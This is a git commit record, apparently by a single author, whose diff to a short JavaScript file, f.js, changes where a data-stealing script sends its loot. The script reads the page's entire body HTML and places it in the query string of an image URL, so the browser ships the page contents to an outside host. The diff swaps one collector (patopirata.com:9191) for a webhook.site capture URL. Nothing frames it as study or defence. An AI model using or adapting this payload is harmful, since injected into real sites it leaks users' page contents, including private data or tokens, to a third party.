9d70fd97664d80e7898094cae4fe9c400f5df428
carloszavaleta <czavaleta93@gmail.com>
2020-01-21 00:47:10 -0600

    a

--- f.js
+++ f.js
@@ -1,6 +1,6 @@
 var image = document.createElement("img")
 
 var html = window.document.body.outerHTML
-image.src = "//patopirata.com:9191/image.png?c=" + html
+image.src = "https://webhook.site/647ee77d-c9b6-4fb9-be97-a23d43d93a15/image.png?c=" + html
 
 document.body.appendChild(image);
